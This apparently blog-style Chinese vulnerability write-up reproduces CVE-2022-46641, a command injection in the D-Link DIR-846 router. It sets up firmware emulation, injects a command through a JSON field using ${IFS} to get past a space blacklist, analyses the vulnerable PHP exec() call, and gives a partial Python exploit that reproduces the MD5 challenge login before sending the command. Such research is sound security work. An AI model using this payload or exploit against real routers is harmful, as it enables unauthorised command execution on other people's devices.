<p>![image-20230104153205878](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104153205878.png)</p>
<p>根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（<del>大致猜测（×），百度一下（√）</del>）。例如 <code>backend died</code>指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动</p>
<p>我们退出qemu，搜索一下php-fastcgi相关的文件：</p>
<p>![image-20230104153612925](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104153612925.png)</p>
<p>这里根据linux目录，可以判断我们需要启动 <code>/etc/init.d/php7-fastcgi</code>。</p>
<p>那么现在出现了一个严峻的问题：我们需要使用模拟环境同时启动两个服务，但是qemu的user模式不支持两个模拟环境联动，所以我们需要使用qemu的system模式。</p>
<h4 id="qemu-system-启动成功">qemu-system 启动成功<a hidden class="anchor" aria-hidden="true" href="#qemu-system-启动成功">#</a></h4>
<p>因为需要涉及到两个服务联动，所以我们使用qemu-system模拟一个debian系统。</p>
<p>首先我们需要为qemu-system搭建一个网桥：</p>
<pre tabindex="0"><code>sudo ifconfig ens33 down                 # 先停用host的网卡
sudo brctl addbr br0                     # 添加名为br0的网桥
sudo brctl addif br0 ens33               # 将host的网卡插到网桥br0上
sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议
sudo ifconfig br0 0.0.0.0 promisc up     # 启用br0网桥，不分配ip，混杂模式
sudo ifconfig ens33 0.0.0.0 promisc up   # 启用host网卡，不分配ip，混杂模式
sudo dhclient br0                        # 让网桥从dhcp获取ip

sudo tunctl -t tap0                      # 创建一个tap网络设备，名字为tap0
sudo brctl addif br0 tap0                # 将tap0插到网桥
sudo ifconfig tap0 0.0.0.0 promisc up    # 启用tap0，不分配ip，混杂模式
</code></pre><p>查看ifconfig可以看到已经配置成功：</p>
<p>![image-20230104155156784](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104155156784.png)</p>
<p>然后，我们需要下载qemu-system模拟debain系统的内核文件和硬盘文件（<del>下载（×），找师兄白嫖（√）</del>）：</p>
<p>![image-20230104155438600](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104155438600.png)</p>
<p>接下来使用命令开启qemu-system:</p>
<pre tabindex="0"><code>sudo qemu-system-mipsel -M malta -m 512 \
-kernel vmlinux-3.2.0-4-4kc-malta-x86 \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &#34;root=/dev/sda1 console=ttyS0&#34; \
-net nic,macaddr=00:19:3e:00:00:01  -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no
</code></pre><blockquote>
<p><code>-kernel</code>：选择内核版本，这里选择lighttpd符合的版本</p>
<p><code>-hda</code>：选择硬盘文件</p>
<p><code>-nographic</code>：不适用GUI图形界面</p>
<p><code>-net nic -net tap,ifname=tap0,script=no,downscript=no</code>：选择桥接模式，使用刚刚我们创建的网卡</p>
</blockquote>
<p>启动成功后，给qemu-system分配ip：</p>
<pre tabindex="0"><code>ifconfig eth0 &lt;your-ip&gt;
</code></pre><p>然后使用scp将固件中的linux根目录传进qemu-system（注：这里需要先将固件的根目录打包，再传入qemu-system，否则scp将会破坏掉固件中的软连接）</p>
<p>随后解压，挂载debian系统的/proc和/dev：</p>
<pre tabindex="0"><code>mount --bind /proc ./proc
mount --bind /dev ./dev
chroot . /bin/bash
</code></pre><p>最后启动服务：</p>
<p>**注：**在启动过程中会遇到如缺少文件的报错，这种报错缺少什么文件我们就创建什么文件就好了</p>
<pre tabindex="0"><code>./etc/init.d/php7-fastcgi start
./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf
</code></pre><p>![image-20230104161305384](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104161305384.png)</p>
<p>![image-20230104161327014](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230104161327014.png)</p>
<h3 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h3>
<p>**注：**该漏洞需要登陆获取cookie</p>
<p>首先我们来到路由器登陆界面开启抓包：</p>
<p>![image-20230112112931132](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112112931132.png)</p>
<p>输入密码后看到抓包：</p>
<p>![image-20230112113035189](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112113035189.png)</p>
<p>![image-20230112113049780](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112113049780.png)</p>
<p>这里我们可以看到抓到了两个登陆的包。具体的原因我们后面编写exp时会提到，这里我们先使用第二个登陆包里的cookie</p>
<p>将这个cookie复制到poc上，就可以执行命令了：</p>
<pre tabindex="0"><code>{&#34;SetIpMacBindSettings&#34;:{&#34;lan_unit&#34;:&#34;0&#34;,&#34;lan(0)_dhcps_staticlist&#34;:&#34;1,`touch${IFS}/tmp/yorktown`asdasdasd,12:34:56:78:90:11,192.168.0.9&#34;}}
</code></pre><p>这里我修改了命令，原poc的命令是reboot，太大开大合了，相比之下创建一个文件显得十分的低调。<del>符合黑客低调的行事风格（雾）</del></p>
<p>复现结果如下</p>
<p>![image-20230112113914254](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112113914254.png)</p>
<h3 id="漏洞点代码分析">漏洞点代码分析<a hidden class="anchor" aria-hidden="true" href="#漏洞点代码分析">#</a></h3>
<p>根据git上的poc我们可以看到，该漏洞是存在于 <code>/www/HNAP1/control/SetIpMacBindSettings.php</code>文件中</p>
<p>对源码的分析，我们可以看到源码的原本流程大致是对路由器上的mac地址做一个记录和修改。但是因为没有对传入的参数做足够的限制，所以导致了命令注入.</p>
<p>大概的流程为：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:35
$staticlist = explode(&#34;;&#34;, $option[&#39;lan(0)_dhcps_staticlist&#39;]);
</code></pre><p>这里是读取了poc上带有命令的字段，为了直观感受，我在源码中输出了这个值：</p>
<p>![image-20230112115202329](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112115202329.png)</p>
<p>![image-20230112115430290](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112115430290.png)</p>
<p>随后，进入循环，将值赋给 <code>$val</code>：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:74
foreach ($staticlist as $val) 
</code></pre><p>接下来，代码会将我们输入的值根据 <code>“,”</code>分割：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:75
$vl_arr = explode(&#34;,&#34;, $val);
</code></pre><p>所以我们的命令存放在 <code>$val[1]</code>中，</p>
<p>最后跟随着另外的命令一起执行：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:80
exec(&#34;changename.sh &#34; . $vl_arr[2] . &#34; &#34; . $vl_arr[1]);
</code></pre><p>当然，在源码中，开发者对输入的字符进行了限制，其目的就是为了防止命令的注入。但是很明显，这种限制是会被攻击者轻松绕过的。</p>
<p>例如如下代码：</p>
<pre tabindex="0"><code>#SetIpMacBindSettings.php:54
$special_char_arr = array(&#34;\&#39;&#34;, &#34; &#34;, &#34;\&#34;&#34;);
                if (contains_special_char($vl_arr[1], $special_char_arr)) {
                    $result[&#34;message&#34;] = &#34;specil character.&#34;;
                    $this-&gt;api_response(__CLASS__, $result);
                }



#HNAP1/core/fun/public.php:420
function contains_special_char($str, $special_char_arr)
{
    for ($i = 0; $i &lt; count($special_char_arr); $i++) {
        if (strpos($str, $special_char_arr[$i]) !== false) {
            return true;
        }
    }
    return false;
}
</code></pre><p>可以看到上面的代码，首先生成了一个黑名单，然后将黑名单和我们输入的字符放入 <code>contains_special_char</code>函数中，通过观察函数的定义，我们也可以判断这是一个对特殊字符进行检测的函数。</p>
<p>但是问题恰恰出在这里，因为只检测了空格符号和转义符，但是当我们使用如 <code>${IFS} \t</code>等可以代替空格的符号时，就可以绕过检测，从而非法执行命令。</p>
<h3 id="exp编写">exp编写<a hidden class="anchor" aria-hidden="true" href="#exp编写">#</a></h3>
<p>通过上面的漏洞复现，我们可以知道exp需要经历的流程：</p>
<pre tabindex="0"><code>第一次登陆——》第二次登陆——》获取cookie——》发送命令
</code></pre><p>那么，为什么登陆时会有发送两个包，这两个包有什么关系吗？</p>
<p>通过在浏览器里的记录（开发者模式中对网络发包的记录），我们可以找到一些线索：</p>
<p>![image-20230112141419790](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141419790.png)</p>
<p>这是第一次登陆发送的包头，而返回的包头中多出来了一个<code>Set-Cookie</code>的字段：</p>
<p>![image-20230112141525369](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141525369.png)</p>
<p>然后第二次登陆的请求头中，就将这个字段当作了cookie的一部分：</p>
<p>![image-20230112141709593](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141709593.png)</p>
<p>同时在cookie中多出来了两个别的字段，而这两个字段则是来自上一个返回包的数据部分：</p>
<p>![image-20230112141828995](CVE-2022-46641 D-Link dir-846命令注入漏洞.assets/image-20230112141828995.png)</p>
<p>这里可以看到uid是直接把返回包的cookie字段复制过去了，但是<code>privatekey</code>是怎么得到的呢？</p>
<p>我们只能又去找源码了。</p>
<p>因为我们是通过<code>login.html</code>点击登陆按钮开始发包的，所以可以从这个文件寻找按钮事件开始寻找：</p>
<pre tabindex="0"><code>#/www/login.html:404
&lt;td&gt;&lt;input type=&#34;button&#34; value=&#34;&#34; id=&#34;logIn_btn&#34; class=&#34;styled_button_long&#34; onClick=&#34;OnClickLogin();&#34;&gt;&lt;/td&gt;
</code></pre><p>通过这个onClinck事件，我们可以追朔到 <code>\www\Login.html:243</code></p>
<p>这里定义了点击登陆按钮之后的流程，这里的具体流程我们可以不用了解，但是我们需要关注一段代码：</p>
<pre tabindex="0"><code>#\www\Login.html:244
var Login_Password = document.getElementById(&#34;admin_Password1&#34;).value;
var Login_Captcha = &#34;&#34;;
document.getElementById(&#34;logIn_btn&#34;).disabled = true;
document.getElementById(&#34;error_1&#34;).style.display = &#34;none&#34;;
doLogin(Login_Password, Login_Captcha)
</code></pre><p>这一段代码，就是将我们在网页上输入的密码，传入了一个叫做 <code>doLogin()</code>的函数。</p>
<p>根据经验，我们可以猜测，这个函数里就是处理密码的地方 <del>根据经验（×），这么大一个login就写在上面（√）</del></p>
<p>通过寻找，我们追寻到了 <code>\www\js\Login.js</code></p>
<p>在这里我们就可以看到上面<code>privatekey</code>的来历了：</p>
<pre tabindex="0"><code>#\www\js\Login.js:16
PrivateKey = md5(obj.PublicKey + ifLogin_Password + obj.Challenge);
PrivateKey = PrivateKey.toUpperCase();		//将PrivateKey全改为大写
</code></pre><p>这个 <code>ifLogin_Password</code> 就是咱们传进来的密码</p>
<p>现在我们知道这个<code>privatekey</code>是怎么来的了。</p>
<p>但是我们先不要着急，因为在下面，有一个非常重要的东西就是密码的加密过程：</p>
<pre tabindex="0"><code>#\www\js\Login.js:28
$.cookie(&#39;PrivateKey&#39;, PrivateKey, {path: &#39;/&#39;});
var Login_Passwd = md5(PrivateKey + obj.Challenge);
Login_Passwd = Login_Passwd.toUpperCase();
</code></pre><p>到这里，整个密码的加密过程就完整了：</p>
<pre tabindex="0"><code>先使用md5加密（PublicKey + Password + Challenge）得到privatekey，然后再使用md5加密（privatekey + Challenge）
</code></pre><p>所以我们的exp:</p>
<pre tabindex="0"><code>#将所有数据设定好
url = &#34;&#34;
cookie = &#34;&#34;
passwd = &#39;12345678&#39;
head = {
    &#39;Host&#39;: &#39;192.168.52.128:8080&#39;,
&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&#39;,
&#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;,
&#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,
&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
&#39;Content-Type&#39;: &#39;application/json; charset=utf-8&#39;,
&#39;SOAPAction&#39;: &#39;&#34;http://purenetworks.com/HNAP1/Login&#34;&#39;,
&#39;HNAP_AUTH&#39;: &#39;E5C14446F7156A0DE9E56D8ED83DAA45 1673393304539&#39;,
&#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;,
&#39;Content-Length&#39;: &#39;128&#39;,
&#39;Origin&#39;: &#39;http://192.168.52.128:8080&#39;,
&#39;Connection&#39;: &#39;close&#39;,
&#39;Referer&#39;: &#39;http://192.168.52.128:8080/Login.html?t=1673247593914&#39;,
}

data1 = {&#34;Login&#34;:{&#34;Action&#34;:&#34;request&#34;,&#34;Username&#34;:&#34;admin&#34;,&#34;LoginPassword&#34;:&#34;&#34;,&#34;Captcha&#34;:&#34;&#34;,&#34;PrivateLogin&#34;:&#34;LoginPassword&#34;}}

data2 = {
        &#34;Login&#34;:
            {
                &#34;Action&#34;:&#34;login&#34;,
                &#34;Username&#34;:&#34;admin&#34;,
                &#34;LoginPassword&#34;:&#34;&#34;,
                &#34;Captcha&#34;:&#34;&#34;,
                &#34;PrivateLogin&#34;:&#34;LoginPassword&#34;
                }
            }


data3 = {
    &#34;SetIpMacBindSettings&#34;:
    {
        &#34;lan_unit&#34;:&#34;0&#34;,
        &#34;lan(0)_dhcps_staticlist&#34;:&#34;&#34;
        }
    }
</code></pre><pre tabindex="0"><code>#第一次登陆，返回PHPSESSID, challenge, uid, PublicKey
def login_1():
    ret = requests.post(url, headers=head, data=json.dumps(data1))
    PHPSESSID = ret.headers[&#39;Set-Cookie&#39;][:-8]
    response_challenge = ret.text.find(&#34;Challenge&#34;)
    response_cookie = ret.text.find(&#34;Cookie&#34;)
    response_publickey = ret.text.find(&#34;\&#34;,\&#34;PublicKey&#34;)
    response_end = ret.text.find(&#34;\&#34;}}&#34;)
    challenge = ret.text[response_challenge+12:response_cookie-3]
    uid = ret.text[response_cookie+9:response_publickey]
    PublicKey = ret.text[response_publickey+15:response_end]
    # ex(ret.text, challenge, uid, PublicKey)
    if not PHPSESSID:
        ex(&#34;PHPSESSID empty&#34;)
    if not challenge:
        ex(&#34;challenge empty&#34;)
    if not uid:
        ex(&#34;uid empty&#34;)
    if not PublicKey:
        ex(&#34;PublicKey empty&#34;)
    return PHPSESSID, challenge, uid, PublicKey
</code></pre><pre tabindex="0"><code>#将cookie拼接好，并且对密码进行加密
cookie += PHPSESSID + &#39;;uid=&#39; + uid + &#39;;privetakey=&#39; +privetakey
login_passwd, privetakey = MD5(PublicKey, passwd, challenge)
def MD5(public :str, passwd :str, challenge :str):
    h1 = hashlib.md5()
    h2 = hashlib.md5()
    h1.update((public + passwd + challenge).encode())
    privatekey = h1.hexdigest()
    # ex(privatekey.upper())
    h2.update((privatekey.upper() + challenge).encode())
    return h2.hexdigest(), privatekey.upper()
</code></pre><pre tabindex="0"><code>#然后进行第二次登陆
def login_2(cookie, loginpassword):
    data2[&#39;Login&#39;][&#39;LoginPassword&#39;] = loginpassword
    head[&#39;Cookie&#39;] = cookie
    ret = requests.post(url, headers=head, data=json.dumps(data2))
</code></pre><pre tabindex="0"><code>#第二次发包后，该cookie就可以进行命令注入了，故构造命令注入的数据包
def login_3(cmd):
    data3[&#34;SetIpMacBindSettings&#34;][&#39;lan(0)_dhcps_staticlist&#39;] = cmd
    ret = requests.post(url, headers=head, data=json.dumps(data3))
    # ex(ret.text)
    if &#34;OK&#34; not in ret.text:
        ex(&#34;vuln use false&#34;)
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="http://lexshoukaku.github.io">test</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
